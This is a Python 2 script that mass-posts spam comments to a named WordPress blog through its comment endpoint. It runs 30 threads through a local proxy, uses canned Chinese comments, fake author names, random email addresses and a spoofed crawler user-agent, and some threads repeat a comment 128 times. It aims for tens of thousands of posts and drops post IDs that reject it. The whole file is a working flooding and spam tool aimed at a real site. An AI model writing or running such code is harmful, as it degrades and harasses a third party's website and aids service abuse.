#coding:utf-8
import httplib2
from threading import Thread, RLock
import random
import urllib
import string
import time
words = ["枸杞子冲水也很好喝的。", "哈哈，金钱网前来互踩", "经常喝", "额。。。貌似还是小处男 不需要补", "很好，又有壮阳新配方了", "好东西，不过我现在貌似也还不需要，哈哈","用处肯定是有的，就看针对个人效果是否够好，不同的牌子也有不同的效果吧，个人意见", "嘎嘎回访", "加油 坚持肯定会有结果的", "多谢指点", "加油啊", "支持", "回访啦，博主加油啊！", "那美腿吸引人啊！", "有没有增肥的呢？", "回访了，哈！", "感谢来访", "回访一下。", "再填一双小爪印~", "瘦腿。。。真的有效吗？", "很不错的哟，关注下了~~", "我想长胖的！有木有方法？", "谷歌以点！", "不错，支持一下", "女子必备的", "这个没听过还有什么瘦腿精油的，我就听过玫瑰精油…………"]
words = map(urllib.quote, words)
authors = ["专五十", "拇指赚", "萌妹", "laken", "APP雄起", "海滨博客", "李文东", "一考必过网周老师", "王光卫中文博客", "李小明", "admin", "阿木木", "Zs", "噶里味美食网", "烂番茄", "糯米汇", "糯米汇", "soubisai", "APP雄起", "屠龙"]
authors = map(urllib.quote, authors)
diclist = []
for l in open('dict.txt').readlines():
    l = l.strip('\n')
    if l.isdigit():
        continue
    diclist.append(l)
build_email = lambda :urllib.quote(random.choice(diclist) + "@" + random.choice(["163","126","sina","gmail","yahoo","hotmail","haha"]) + ".com")
all_target = [i for i in xrange(1, 416)]
with open('dead.txt', 'r') as f:
    for i in f.read().split(','):
        try:
            all_target.pop(int(i))
        except:
            pass
write_lock = RLock()
count_lock = RLock()
count = 0
class f(Thread):
    def __init__(self, sid):
        self.sid = sid
        self.h = httplib2.Http(timeout = 15, proxy_info = httplib2.ProxyInfo(httplib2.socks.PROXY_TYPE_HTTP_NO_TUNNEL, "127.0.0.1", 23333))
        Thread.__init__(self)

    def run(self):
        global count
        while count < 32768:
            _id = random.choice(all_target)
            try:
                a, b = self.h.request("http://www.zhouleyu.com/wp-comments-post.php", method='POST', body="author="+random.choice(authors)+"&email="+ build_email() + "&url=&comment="+(random.choice(words) * (128 if self.sid>20 else 1))+"&submit=%E5%8F%91%E8%A1%A8%E8%AF%84%E8%AE%BA&comment_post_ID="+str(_id)+"&comment_parent=", headers={'User-agent':'Googlebot-Fuck-Ads', 'Content-type':'application/x-www-form-urlencoded', 'Accept-Encoding':'gzip,deflate', 'Connection':'keep-alive', 'Referer':'Referer:http://www.zhouleyu.com/'})
            except:
                print('[%d]Sleep 5' % self.sid)
                time.sleep(5)
                continue
            if a['status'] > '302' and self.sid<=20:
                write_lock.acquire(blocking = 1)
                try:
                    all_target.pop(all_target.index(_id))
                except IndexError:
                    pass
                else:
                    print('Remove target %d' % _id)
                    with open('dead.txt', 'a') as f:
                        f.write(',%d' % _id)
                write_lock.release()
            else:
                count_lock.acquire()
                count += 1
                print ("[%d]Target done:%d" % (self.sid, count))
                count_lock.release()
            time.sleep(random.random()*10 + 2)
threads = []
for i in range(30):
    _f = f(i + 1)
    _f.start()
    threads.append(_f)

for i in range(15):
    threads[i].join()